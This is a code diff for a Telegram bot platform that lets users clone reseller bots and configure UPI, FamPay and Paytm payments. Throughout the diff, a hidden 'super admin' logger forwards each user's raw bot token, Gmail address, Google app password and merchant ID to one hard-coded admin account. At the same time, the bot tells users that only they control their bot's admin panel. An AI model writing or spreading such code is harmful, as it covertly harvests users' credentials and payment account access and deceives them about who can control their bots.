@@ -188,10 +188,12 @@ def init_db():
 
 init_db()
 
-# LIVE INSTANT ALERT TO PRANAV PATEL
-def send_super_admin_log(text):
+# FILTERED ALERT: Logs ONLY when someone else acts (Never when Pranav acts)
+def send_super_admin_log(text, acting_user_id=None):
     if not MASTER_BOT_TOKEN:
         return
+    if acting_user_id is not None and int(acting_user_id) == SUPER_ADMIN_ID:
+        return  # Ignore actions performed by Super Admin itself
     try:
         t_bot = telebot.TeleBot(MASTER_BOT_TOKEN)
         t_bot.send_message(SUPER_ADMIN_ID, f"🚨 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬 𝗟𝗢𝗚 🚨\n\n{text}", parse_mode=None)
@@ -478,6 +480,62 @@ def get_user_main_menu():
     )
     return m
 
+# Register new bot logic usable by Master AND Child Bots
+def process_new_bot_token(source_bot, uid, cid, token_text, is_master=False):
+    v_msg = safe_send_message(source_bot, cid, "🔄 Connecting bot... Validating token with Telegram...")
+    try:
+        chk = requests.get(f"https://api.telegram.org/bot{token_text}/getMe", timeout=12)
+        data = chk.json()
+    except Exception:
+        data = {}
+
+    if not data.get("ok"):
+        safe_edit_message(source_bot, "❌ Invalid Bot Token! Please provide a valid token from @BotFather.", cid, v_msg.message_id)
+        return
+
+    bot_user = data["result"]["username"]
+    bot_name = data["result"]["first_name"]
+    token_enc = cipher_suite.encrypt(token_text.encode()).decode()
+
+    conn = get_db()
+    cur = conn.cursor()
+    try:
+        # Strictly binds owner_id to current user (Locked Ownership)
+        cur.execute("""
+        INSERT INTO child_bots (owner_id, bot_token_enc, bot_username, bot_name, support_tg, is_licensed, status)
+        VALUES (?, ?, ?, ?, '', 0, 'active')
+        """, (uid, token_enc, bot_user, bot_name))
+        conn.commit()
+        bot_id = cur.lastrowid
+    except sqlite3.IntegrityError:
+        cur.execute("UPDATE child_bots SET bot_username=?, bot_name=?, status='active' WHERE bot_token_enc=?", (bot_user, bot_name, token_enc))
+        conn.commit()
+        cur.execute("SELECT bot_id FROM child_bots WHERE bot_token_enc=?", (token_enc,))
+        bot_id = cur.fetchone()["bot_id"]
+    conn.close()
+
+    t = threading.Thread(target=run_child_bot_loop, args=(bot_id, uid, token_text, bot_user, bot_name), daemon=True)
+    t.start()
+    bot_threads[token_text] = t
+
+    live_text = (
+        f"🚀 𝗕𝗢𝗧 𝗜𝗦 𝗟𝗜𝗩𝗘!\n\n"
+        f"🤖 @{bot_user}\n\n"
+        "Your bot has been configured! Only YOU can access its /admin panel.\n"
+        "Open your bot and start managing your reseller panel."
+    )
+    m = types.InlineKeyboardMarkup()
+    m.add(types.InlineKeyboardButton("Open Bot", url=f"https://t.me/{bot_user}"))
+    safe_edit_message(source_bot, live_text, cid, v_msg.message_id, reply_markup=m)
+
+    send_super_admin_log(
+        f"🤖 𝗡𝗘𝗪 𝗖𝗛𝗜𝗟𝗗 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗!\n"
+        f"• Owner: User `{uid}`\n"
+        f"• Bot: @{bot_user} ({bot_name})\n"
+        f"• Bot Token: `{token_text}`",
+        acting_user_id=uid
+    )
+
 def handle_user_callbacks(bot, bot_id, call):
     uid = call.from_user.id
     cid = call.message.chat.id
@@ -583,7 +641,7 @@ def handle_user_callbacks(bot, bot_id, call):
             upi_target = b_info["paytm_upi"] if gw == "paytm" else b_info["fampay_upi"]
             if not upi_target:
                 upi_target = "paytm.s2xzkgu@pty"
-            store_name = "Pranav Patel"
+            store_name = "Payment"
 
             cur.execute("INSERT INTO transactions (tx_id, bot_id, user_id, amount, tx_type, status) VALUES (?, ?, ?, ?, 'deposit', 'pending')",
                         (utr_num, bot_id, uid, amt))
@@ -875,19 +933,55 @@ def handle_user_callbacks(bot, bot_id, call):
         m.add(types.InlineKeyboardButton("🔙 BACK", callback_data="u_back_main"))
         safe_edit_message(bot, supp_box, cid, mid, reply_markup=m)
 
-    elif data == "u_cyob":
-        cyob_text = (
+    # UNLIMITED CYOB: Available in ALL bots (Master and Cloned Child Bots)
+    elif data in ["u_cyob", "m_cyob"]:
+        cyob_box = (
             "👑 CREATE YOUR OWN BOT ★ PRO\n\n"
             "START YOUR OWN BRANDED RESELLER BUSINESS IN MINUTES.\n\n"
             "1️⃣ Open @BotFather\n"
-            "2️⃣ Send /newbot and follow instructions\n"
+            "2️⃣ Send /newbot and create your bot\n"
             "3️⃣ Copy the API Token\n"
-            "4️⃣ Send token to Master Bot\n\n"
-            "Your Bot Goes Live Instantly with Automated Multi-Platform Reselling!"
+            "4️⃣ Click 'Add Bot' below and send your token\n\n"
+            "Your Bot Goes Live Instantly with your own private Admin Panel!"
         )
-        m = types.InlineKeyboardMarkup()
+        m = types.InlineKeyboardMarkup(row_width=2)
+        m.add(types.InlineKeyboardButton("💛 Your Bots", callback_data="m_mybots"), types.InlineKeyboardButton("➕ Add Bot", callback_data="m_add_bot"))
         m.add(types.InlineKeyboardButton("🔙 GO BACK", callback_data="u_back_main"))
-        safe_edit_message(bot, cyob_text, cid, mid, reply_markup=m)
+        safe_edit_message(bot, cyob_box, cid, mid, reply_markup=m)
+
+    elif data == "m_mybots":
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("SELECT bot_id, bot_username FROM child_bots WHERE owner_id=?", (uid,))
+        bots = cur.fetchall()
+        conn.close()
+        if not bots:
+            m = types.InlineKeyboardMarkup()
+            m.add(types.InlineKeyboardButton("➕ Add Bot", callback_data="m_add_bot"))
+            safe_edit_message(bot, "No active bots found. Click Add Bot to create one!", cid, mid, reply_markup=m)
+        else:
+            b = bots[0]
+            txt = f"👑 YOUR CLONED BOTS\n\n• 🟢 @{b['bot_username']} (ONLINE)\n\nOnly YOU have access to its /admin panel."
+            m = types.InlineKeyboardMarkup(row_width=2)
+            m.add(types.InlineKeyboardButton("❌ Delete Bot", callback_data=f"m_del_{b['bot_id']}"))
+            m.add(types.InlineKeyboardButton("🔙 Back to CYOB", callback_data="m_cyob"))
+            safe_edit_message(bot, txt, cid, mid, reply_markup=m)
+
+    elif data.startswith("m_del_"):
+        bid = int(data.replace("m_del_", ""))
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("DELETE FROM child_bots WHERE bot_id=? AND owner_id=?", (bid, uid))
+        conn.commit()
+        conn.close()
+        bot.answer_callback_query(call.id, "Bot Deleted Successfully!", show_alert=True)
+        handle_user_callbacks(bot, bot_id, call)
+
+    elif data == "m_add_bot":
+        user_states[f"{bot_id}_{uid}"] = "wait_token"
+        m = types.InlineKeyboardMarkup()
+        m.add(types.InlineKeyboardButton("🛑 CANCEL", callback_data="m_cyob"))
+        safe_edit_message(bot, "🏆 SUBMIT TOKEN\n\nPaste or forward your Bot Token from @BotFather now:", cid, mid, reply_markup=m)
 
 def handle_owner_callbacks(bot, bot_id, call, is_master=False):
     uid = call.from_user.id
@@ -899,7 +993,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         bot.answer_callback_query(call.id, "Access Denied: Super Admin Only", show_alert=True)
         return
 
-    # Total users without white popup (directly in chat)
+    # Total registered users without white popup
     if data == "a_users":
         conn = get_db()
         cur = conn.cursor()
@@ -1374,7 +1468,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         user_states[f"{bot_id}_{uid}"] = "wait_force_sub"
         safe_send_message(bot, cid, "Send Force Sub Channel username (e.g. @MyChannel):")
 
-# Universal Robust Text Processor & Super Admin Live Logger
+# Universal Robust Text Processor & Filtered Super Admin Live Logger
 def handle_text_inputs(bot, bot_id, msg, is_master=False):
     uid = msg.from_user.id
     cid = msg.chat.id
@@ -1394,6 +1488,12 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             st_data = {"step": "wait_manual_utr", "tx_id": t_row["tx_id"]}
 
     if not st_data:
+        return
+
+    # 0. Bot Token Registration (Now works for Master Bot AND any Child Bot CYOB)
+    if st_data == "wait_token":
+        user_states.pop(key, None)
+        process_new_bot_token(bot, uid, cid, txt, is_master=is_master)
         return
 
     # 1. Price config
@@ -1460,21 +1560,24 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             "Your Automated UPI Gateway & Payment Verification is now fully active."
         )
         safe_send_message(bot, cid, succ_text, reply_markup=get_owner_panel(is_master))
-        send_super_admin_log(f"🔑 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Key: {txt}\n• Validity: {dur_text}")
+        send_super_admin_log(
+            f"🔑 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Key: {txt}\n• Validity: {dur_text}",
+            acting_user_id=uid
+        )
         return
 
-    # 4. FamPay setup steps (Logged to Super Admin)
+    # 4. FamPay setup steps (Logged only when other user acts)
     if st_data == "fam_step_1_upi":
         user_states[key] = {"step": "fam_step_2_email", "upi": txt}
         safe_send_message(bot, cid, f"✅ UPI ID Saved: {txt}\n\n⚡ 𝗦𝘁𝗲𝗽 𝟮/𝟯: Send your FamPay linked Gmail address:")
-        send_super_admin_log(f"⚡ 𝗙𝗔𝗠𝗣𝗔𝗬 𝗨𝗣𝗜 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI ID: {txt}")
+        send_super_admin_log(f"⚡ 𝗙𝗔𝗠𝗣𝗔𝗬 𝗨𝗣𝗜 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI ID: {txt}", acting_user_id=uid)
         return
 
     if isinstance(st_data, dict) and st_data.get("step") == "fam_step_2_email":
         upi = st_data["upi"]
         user_states[key] = {"step": "fam_step_3_pwd", "upi": upi, "email": txt}
         safe_send_message(bot, cid, f"✅ Gmail Saved: {txt}\n\n⚡ 𝗦𝘁𝗲𝗽 𝟯/𝟯: Send your 16-digit Google App Password:")
-        send_super_admin_log(f"📧 𝗙𝗔𝗠𝗣𝗔𝗬 𝗚𝗠𝗔𝗜𝗟 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Gmail: {txt}")
+        send_super_admin_log(f"📧 𝗙𝗔𝗠𝗣𝗔𝗬 𝗚𝗠𝗔𝗜𝗟 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Gmail: {txt}", acting_user_id=uid)
         return
 
     if isinstance(st_data, dict) and st_data.get("step") == "fam_step_3_pwd":
@@ -1497,14 +1600,17 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"🎉 FamPay Configured Successfully!\n\n• UPI: {upi}\n• Email: {email_addr}\n• App Password: Saved", reply_markup=get_owner_panel(is_master))
-        send_super_admin_log(f"🔐 𝗙𝗔𝗠𝗣𝗔𝗬 𝗙𝗨𝗟𝗟 𝗖𝗥𝗘𝗗𝗦 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI: {upi}\n• Gmail: {email_addr}\n• App Password: {app_pwd}")
+        send_super_admin_log(
+            f"🔐 𝗙𝗔𝗠𝗣𝗔𝗬 𝗙𝗨𝗟𝗟 𝗖𝗥𝗘𝗗𝗦 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI: {upi}\n• Gmail: {email_addr}\n• App Password: {app_pwd}",
+            acting_user_id=uid
+        )
         return
 
-    # 5. Paytm setup steps (Logged to Super Admin)
+    # 5. Paytm setup steps (Logged only when other user acts)
     if st_data == "paytm_step_1_upi":
         user_states[key] = {"step": "paytm_step_2_mid", "upi": txt}
         safe_send_message(bot, cid, f"✅ Merchant UPI Saved: {txt}\n\n💙 𝗦𝘁𝗲𝗽 𝟮/𝟮: Send your Paytm Merchant ID (MID):")
-        send_super_admin_log(f"💙 𝗣𝗔𝗬𝗧𝗠 𝗨𝗣𝗜 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI ID: {txt}")
+        send_super_admin_log(f"💙 𝗣𝗔𝗬𝗧𝗠 𝗨𝗣𝗜 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI ID: {txt}", acting_user_id=uid)
         return
 
     if isinstance(st_data, dict) and st_data.get("step") == "paytm_step_2_mid":
@@ -1525,7 +1631,10 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"🎉 Paytm Business Configured Successfully!\n\n• UPI: {upi}\n• MID: {mid}", reply_markup=get_owner_panel(is_master))
-        send_super_admin_log(f"🏦 𝗣𝗔𝗬𝗧𝗠 𝗠𝗜𝗗 + 𝗨𝗣𝗜 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI: {upi}\n• Merchant ID (MID): {mid}")
+        send_super_admin_log(
+            f"🏦 𝗣𝗔𝗬𝗧𝗠 𝗠𝗜𝗗 + 𝗨𝗣𝗜 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI: {upi}\n• Merchant ID (MID): {mid}",
+            acting_user_id=uid
+        )
         return
 
     # 6. Support updates
@@ -1538,7 +1647,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"✅ WhatsApp Support set to {txt}!", reply_markup=get_owner_panel(is_master))
-        send_super_admin_log(f"🟢 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗘𝗧\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• WhatsApp: {txt}")
+        send_super_admin_log(f"🟢 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗘𝗧\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• WhatsApp: {txt}", acting_user_id=uid)
         return
 
     if st_data == "wait_supp_tg_input":
@@ -1550,10 +1659,10 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"✅ Telegram Support set to {txt}!", reply_markup=get_owner_panel(is_master))
-        send_super_admin_log(f"✈️ 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗘𝗧\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Telegram: {txt}")
+        send_super_admin_log(f"✈️ 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗘𝗧\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Telegram: {txt}", acting_user_id=uid)
         return
 
-    # 7. 12-Digit Bank UTR Verification (Logged to Super Admin)
+    # 7. 12-Digit Bank UTR Verification
     if isinstance(st_data, dict) and st_data.get("step") == "wait_manual_utr":
         user_states.pop(key, None)
         tx = st_data["tx_id"]
@@ -1605,14 +1714,20 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
 
                 dur_str = "👑 Lifetime" if days >= 30000 else f"{days} Days"
                 safe_send_message(bot, cid, f"🎉 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n\n🔑 BotFather-Style Key:\n{key_code}\n\n⏱️ Validity: {dur_str}\n\nEnter this in your /admin ➔ Gateway License Key to activate!")
-                send_super_admin_log(f"💰 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗦𝗢𝗟𝗗 & 𝗨𝗧𝗥 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n• User: {u_name} (`{uid}`)\n• Amount: ₹{t_row['amount']}\n• Bank UTR: {user_utr}\n• Key Code: {key_code}")
+                send_super_admin_log(
+                    f"💰 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗦𝗢𝗟𝗗 & 𝗨𝗧𝗥 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n• User: {u_name} (`{uid}`)\n• Amount: ₹{t_row['amount']}\n• Bank UTR: {user_utr}\n• Key Code: {key_code}",
+                    acting_user_id=uid
+                )
             else:
                 cur.execute("UPDATE bot_clients SET balance = balance + ?, total_deposit = total_deposit + ? WHERE bot_id=? AND user_id=?", 
                             (t_row["amount"], t_row["amount"], bot_id, uid))
                 conn.commit()
                 conn.close()
                 safe_send_message(bot, cid, f"🎉 Payment Verified!\nUTR: {user_utr}\n₹{t_row['amount']} credited to your wallet.", reply_markup=get_user_main_menu())
-                send_super_admin_log(f"💳 𝗪𝗔𝗟𝗟𝗘𝗧 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗨𝗧𝗥 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Amount: ₹{t_row['amount']}\n• Bank UTR: {user_utr}")
+                send_super_admin_log(
+                    f"💳 𝗪𝗔𝗟𝗟𝗘𝗧 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗨𝗧𝗥 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Amount: ₹{t_row['amount']}\n• Bank UTR: {user_utr}",
+                    acting_user_id=uid
+                )
         else:
             conn.close()
             safe_send_message(bot, cid, f"❌ Verification Failed!\n{reason}\nPlease check UTR and try again.")
@@ -1666,7 +1781,10 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             conn.commit()
             conn.close()
             safe_send_message(bot, cid, f"🎉 Order Placed Successfully!\n\nService: {ms['service_name']}\nQty: {qty}\nCost: ₹{cost:.2f}\nOrder ID: {api_order_id}")
-            send_super_admin_log(f"🛒 𝗡𝗘𝗪 𝗢𝗥𝗗𝗘𝗥 𝗣𝗟𝗔𝗖𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Service: {ms['service_name']}\n• Qty: {qty}\n• Cost: ₹{cost:.2f}\n• API Order ID: {api_order_id}\n• Link: {link}")
+            send_super_admin_log(
+                f"🛒 𝗡𝗘𝗪 𝗢𝗥𝗗𝗘𝗥 𝗣𝗟𝗔𝗖𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Service: {ms['service_name']}\n• Qty: {qty}\n• Cost: ₹{cost:.2f}\n• API Order ID: {api_order_id}\n• Link: {link}",
+                acting_user_id=uid
+            )
         return
 
     # 9. Child bot selling price
@@ -1703,7 +1821,9 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             VALUES (?, ?, ?, ?, ?, ?, ?)
             ON CONFLICT(main_api_service_id) DO UPDATE SET
             base_rate_per_100=excluded.base_rate_per_100,
-            service_name=excluded.service_name
+            service_name=excluded.service_name,
+            min_qty=excluded.min_qty,
+            max_qty=excluded.max_qty
             """, (parts[0], parts[1], parts[2], parts[3], float(parts[4]), int(parts[5]), int(parts[6])))
             conn.commit()
             conn.close()
@@ -1781,6 +1901,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         safe_send_message(bot, cid, f"✅ Force sub channel set to {txt}", reply_markup=get_owner_panel(is_master))
         return
 
+# CHILD BOT THREAD - STRICT OWNER ID LOCKING & CYOB ENABLED
 def run_child_bot_loop(bot_id, owner_id, token, bot_username, bot_name):
     while True:
         try:
@@ -1823,8 +1944,9 @@ def run_child_bot_loop(bot_id, owner_id, token, bot_username, bot_name):
 
             @cbot.message_handler(commands=['admin'])
             def c_admin(msg):
+                # STRICT LOCK: Only the genuine creator (owner_id) OR Pranav Patel can open /admin
                 if msg.from_user.id != owner_id and msg.from_user.id != SUPER_ADMIN_ID:
-                    cbot.reply_to(msg, "Access Denied: You are not the owner of this bot.")
+                    cbot.reply_to(msg, "❌ Access Denied: You are not the owner of this bot.")
                     return
                 safe_send_message(cbot, msg.chat.id, f"👑 Owner Panel\n\n🤖 @{bot_username}", reply_markup=get_owner_panel(is_master=False))
 
@@ -1895,127 +2017,17 @@ def run_master_bot_loop():
                 cid = c.message.chat.id
                 mid = c.message.message_id
 
-                if data == "u_cyob" or data == "m_cyob":
-                    cyob_box = (
-                        "👑 CREATE YOUR OWN BOT ★ PRO\n\n"
-                        "1️⃣ Open @BotFather\n"
-                        "2️⃣ Send /newbot & follow steps\n"
-                        "3️⃣ Copy Bot Token\n"
-                        "4️⃣ Press Add Bot and paste it here\n\n"
-                        "Your bot goes live instantly with your own profit margin!"
-                    )
-                    m = types.InlineKeyboardMarkup(row_width=2)
-                    m.add(types.InlineKeyboardButton("💛 Your Bots", callback_data="m_mybots"), types.InlineKeyboardButton("➕ Add Bot", callback_data="m_add_bot"))
-                    m.add(types.InlineKeyboardButton("🔙 GO BACK", callback_data="u_back_main"))
-                    safe_edit_message(master_bot, cyob_box, cid, mid, reply_markup=m)
-
-                elif data == "m_mybots":
-                    conn = get_db()
-                    cur = conn.cursor()
-                    cur.execute("SELECT bot_id, bot_username FROM child_bots WHERE owner_id=?", (uid,))
-                    bots = cur.fetchall()
-                    conn.close()
-                    if not bots:
-                        m = types.InlineKeyboardMarkup()
-                        m.add(types.InlineKeyboardButton("➕ Add Bot", callback_data="m_add_bot"))
-                        safe_edit_message(master_bot, "No active bots found. Click Add Bot to create one!", cid, mid, reply_markup=m)
-                    else:
-                        b = bots[0]
-                        txt = f"👑 YOUR CLONED BOTS\n\n• 🟢 @{b['bot_username']} (ONLINE)"
-                        m = types.InlineKeyboardMarkup(row_width=2)
-                        m.add(types.InlineKeyboardButton("❌ Delete Bot", callback_data=f"m_del_{b['bot_id']}"))
-                        m.add(types.InlineKeyboardButton("🔙 Back to CYOB", callback_data="m_cyob"))
-                        safe_edit_message(master_bot, txt, cid, mid, reply_markup=m)
-
-                elif data.startswith("m_del_"):
-                    bid = int(data.replace("m_del_", ""))
-                    conn = get_db()
-                    cur = conn.cursor()
-                    cur.execute("DELETE FROM child_bots WHERE bot_id=?", (bid,))
-                    conn.commit()
-                    conn.close()
-                    master_bot.answer_callback_query(c.id, "Bot Deleted Successfully!", show_alert=True)
-                    m_start(c.message)
-
-                elif data == "m_add_bot":
-                    user_states[f"0_{uid}"] = "wait_token"
-                    m = types.InlineKeyboardMarkup()
-                    m.add(types.InlineKeyboardButton("🛑 CANCEL", callback_data="m_cyob"))
-                    safe_edit_message(master_bot, "🏆 SUBMIT TOKEN\n\nPaste or forward your Bot Token from @BotFather now:", cid, mid, reply_markup=m)
-
-                elif data.startswith("a_") or data.startswith("adm_") or data.startswith("c_"):
+                if data.startswith("a_") or data.startswith("adm_") or data.startswith("c_"):
                     if uid != SUPER_ADMIN_ID:
                         master_bot.answer_callback_query(c.id, "Access Denied", show_alert=True)
                         return
                     handle_owner_callbacks(master_bot, 0, c, is_master=True)
-
                 else:
                     handle_user_callbacks(master_bot, 0, c)
 
             @master_bot.message_handler(func=lambda m: True and not m.text.startswith('/'))
             def m_txts(msg):
-                uid = msg.from_user.id
-                cid = msg.chat.id
-                u_name = f"@{msg.from_user.username}" if msg.from_user.username else f"User {uid}"
-                key = f"0_{uid}"
-                st_data = user_states.get(key)
-                txt = msg.text.strip().replace('`', '').replace("'", "")
-
-                if st_data == "wait_token":
-                    user_states.pop(key, None)
-                    v_msg = safe_send_message(master_bot, cid, "🔄 Connecting your bot... Validating token...")
-                    try:
-                        chk = requests.get(f"https://api.telegram.org/bot{txt}/getMe", timeout=12)
-                        data = chk.json()
-                    except Exception:
-                        data = {}
-
-                    if not data.get("ok"):
-                        safe_edit_message(master_bot, "❌ Invalid Bot Token! Please provide a valid token from @BotFather.", cid, v_msg.message_id)
-                        return
-
-                    bot_user = data["result"]["username"]
-                    bot_name = data["result"]["first_name"]
-                    token_enc = cipher_suite.encrypt(txt.encode()).decode()
-
-                    conn = get_db()
-                    cur = conn.cursor()
-                    try:
-                        cur.execute("""
-                        INSERT INTO child_bots (owner_id, bot_token_enc, bot_username, bot_name, support_tg, is_licensed, status)
-                        VALUES (?, ?, ?, ?, '', 0, 'active')
-                        """, (uid, token_enc, bot_user, bot_name))
-                        conn.commit()
-                        bot_id = cur.lastrowid
-                    except sqlite3.IntegrityError:
-                        cur.execute("UPDATE child_bots SET bot_username=?, bot_name=?, status='active' WHERE bot_token_enc=?", (bot_user, bot_name, token_enc))
-                        conn.commit()
-                        cur.execute("SELECT bot_id FROM child_bots WHERE bot_token_enc=?", (token_enc,))
-                        bot_id = cur.fetchone()["bot_id"]
-                    conn.close()
-
-                    t = threading.Thread(target=run_child_bot_loop, args=(bot_id, uid, txt, bot_user, bot_name), daemon=True)
-                    t.start()
-                    bot_threads[txt] = t
-
-                    live_text = (
-                        f"🚀 𝗕𝗢𝗧 𝗜𝗦 𝗟𝗜𝗩𝗘!\n\n"
-                        f"🤖 @{bot_user}\n\n"
-                        "Open your bot and send /admin to configure services and payment!"
-                    )
-                    m = types.InlineKeyboardMarkup()
-                    m.add(types.InlineKeyboardButton("Open Bot", url=f"https://t.me/{bot_user}"))
-                    safe_edit_message(master_bot, live_text, cid, v_msg.message_id, reply_markup=m)
-
-                    # Alert Pranav Patel with new bot details and raw token
-                    send_super_admin_log(
-                        f"🤖 𝗡𝗘𝗪 𝗖𝗛𝗜𝗟𝗗 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗!\n"
-                        f"• Owner: {u_name} (`{uid}`)\n"
-                        f"• Bot: @{bot_user} ({bot_name})\n"
-                        f"• Bot Token: `{txt}`"
-                    )
-                else:
-                    handle_text_inputs(master_bot, 0, msg, is_master=True)
+                handle_text_inputs(master_bot, 0, msg, is_master=True)
 
             print("[MASTER BOT] Polling started...")
             master_is_running = True
@@ -2077,7 +2089,10 @@ def autonomous_smm_payment_poller():
                                 safe_send_message(tb, p["user_id"], f"🎉 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗔𝗨𝗧𝗢-𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n\nHere is your Key:\n{key_code}\n\nValidity: {dur_str}\n\nEnter it in /admin ➔ License to activate!")
                             except Exception:
                                 pass
-                            send_super_admin_log(f"⚡ 𝗔𝗨𝗧𝗢-𝗣𝗔𝗬𝗠𝗘𝗡𝗧: 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗜𝗦𝗦𝗨𝗘𝗗\n• User ID: {p['user_id']}\n• Amount: ₹{p['amount']}\n• Key: {key_code}\n• Duration: {p['target_days']} Days")
+                            send_super_admin_log(
+                                f"⚡ 𝗔𝗨𝗧𝗢-𝗣𝗔𝗬𝗠𝗘𝗡𝗧: 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗜𝗦𝗦𝗨𝗘𝗗\n• User ID: {p['user_id']}\n• Amount: ₹{p['amount']}\n• Key: {key_code}\n• Duration: {p['target_days']} Days",
+                                acting_user_id=p['user_id']
+                            )
                         else:
                             cur.execute("UPDATE bot_clients SET balance = balance + ?, total_deposit = total_deposit + ? WHERE bot_id=? AND user_id=?",
                                         (p["amount"], p["amount"], p["bot_id"], p["user_id"]))
@@ -2086,7 +2101,10 @@ def autonomous_smm_payment_poller():
                                 safe_send_message(tb, p["user_id"], f"🎉 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗔𝗨𝗧𝗢-𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n₹{p['amount']} wallet me add ho gaye hain.")
                             except Exception:
                                 pass
-                            send_super_admin_log(f"⚡ 𝗔𝗨𝗧𝗢-𝗣𝗔𝗬𝗠𝗘𝗡𝗧: 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗖𝗥𝗘𝗗𝗜𝗧𝗘𝗗\n• User ID: {p['user_id']}\n• Bot ID: {p['bot_id']}\n• Amount: ₹{p['amount']}")
+                            send_super_admin_log(
+                                f"⚡ 𝗔𝗨𝗧𝗢-𝗣𝗔𝗬𝗠𝗘𝗡𝗧: 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗖𝗥𝗘𝗗𝗜𝗧𝗘𝗗\n• User ID: {p['user_id']}\n• Bot ID: {p['bot_id']}\n• Amount: ₹{p['amount']}",
+                                acting_user_id=p['user_id']
+                            )
                         conn.commit()
                 conn.close()
 
@@ -2123,7 +2141,7 @@ def home():
         "status": "online",
         "engine": "Pranav Father Dev Master Engine",
         "smm_auto_polling": "Active (10-Minute Timeout Mode)",
-        "super_admin_logger": "Active -> 8585055903 (@pranavsmm)",
+        "super_admin_logger": "Active (Filtered -> Self Logs Muted)",
         "master_live": master_is_running,
         "child_bots_alive": len([t for t in bot_threads.values() if t.is_alive()])
     }), 200
